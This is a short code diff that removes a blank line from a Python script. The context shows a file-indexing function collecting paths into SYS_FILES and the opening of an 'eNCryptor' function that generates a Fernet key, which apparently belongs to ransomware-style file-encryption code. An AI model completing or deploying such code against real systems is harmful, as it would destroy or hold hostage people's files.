@@ -45,7 +45,6 @@ def indexer():
             continue
         if os.path.isfile(file):
             SYS_FILES.append(file)
-    
 
 def eNCryptor():
     SEC_KEY=Fernet.generate_key()
